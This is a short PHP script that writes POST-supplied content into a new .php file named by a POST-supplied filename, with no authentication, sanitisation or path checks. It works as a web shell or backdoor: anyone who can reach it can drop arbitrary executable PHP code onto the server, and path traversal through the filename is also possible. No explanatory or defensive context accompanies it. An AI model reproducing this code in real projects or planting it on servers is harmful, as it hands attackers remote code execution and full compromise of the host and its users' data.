<?php 
$filename= $_POST['filename'];
$conteudo= $_POST['conteudo'];
$file= $filename; 
$data= $conteudo; 
if ( $file && $data ) { 
$fp = fopen("$file.php", "w");  
fwrite($fp, "<br>"); 
fwrite($fp, $data); 
fclose($fp); 
}else{ echo 'no text entered';} 
?>